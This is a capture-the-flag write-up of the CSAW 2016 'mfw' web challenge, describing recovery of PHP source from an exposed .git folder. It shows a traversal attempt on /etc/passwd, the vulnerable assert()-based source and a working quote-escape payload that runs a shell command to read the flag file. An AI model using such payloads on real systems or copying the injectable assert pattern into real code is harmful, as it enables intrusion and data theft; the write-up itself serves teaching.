# CSAW CTF 2016 mfw Writeup

mfw was a web challenge that included one flag for 125 points.

When launching the mfw web site at web.chal.csaw.io:8000 was introduced by the phrases 

```
Welcome to my website!
I wrote it myself from scratch!
``` 

and this is how it basically looked like: A navigation pane with three links to `Home`, `About` and `Contact`. While Home and Contact did not show something interesting, the About page revealed some nice information as he wrote: 

```
I wrote this website all by myself in under a week!
I used Git, PHP and Bootstrap 
```

Next to this it was easy to see that the developer created a common templating system based on the GET parameter `page` as all URL looked like the following:

```
http://web.chal.csaw.io:8000/?page={home,about,contact}
```

Further investigation of the source code revealed that formerly there seemed to be a fourth link within the navigation pane:

```
<ul class="nav navbar-nav">
    <li ><a href="?page=home">Home</a></li>
	<li class="active"><a href="?page=about">About</a></li>
	<li ><a href="?page=contact">Contact</a></li>
	<!--<li ><a href="?page=flag">My secrets</a></li> -->
</ul> 
```

For sure, the most obvious and therefore first try was to use a local file inclusion to get the output of /etc/passwd or the flag.php file but the following answer was returned:

```
http://web.chal.csaw.io:8000/?page=../../../../../etc/passwd

Detected hacking attempt!
```

Some more tests with different payloads and encodings lead to the fact that the code somehow detects two points, so a simple directory traversal was not possible. After some tries I found out the the flag.php file was lying within a folder called `templates`, but the inclusion of the file did not show any further information so my guess was that the flag is saved within a PHP variable of the file. 

Following the hint from the `About` page I tried to see whether the developer forgot to exclude the `.git` directory from the web server and voila: a directory listing showing the default content of a .git folder was found:

```
branches  description  hooks  info  objects      refs
config    HEAD         index  logs  packed-refs
```

Now I cloned the git repository and used `git diff` which revealed the source code of the index.php file as follows:

```
<?php
-
-if (isset($_GET['page'])) {
-       $page = $_GET['page'];
-} else {
-       $page = "home";
-}
-
-$file = "templates/" . $page . ".php";
-
-// I heard '..' is dangerous!
-assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
-
-// TODO: Make this look nice
-assert("file_exists('$file')") or die("That file doesn't exist!");
```

Jackpot! The first use of the `assert` function suffers from a remote code execution vulnerability as there is no input validation that restricts a user from using a single quote which enables him to break out of the first argument within the `strpos()` function. 

Therefore, the following payload:

```
flag','..')+or+system('cat+templates/flag.php');//
``` 

lead to the response containing the flag:

```
<?php $FLAG="flag{3vald_@ss3rt_1s_best_a$$ert}"; ?>
```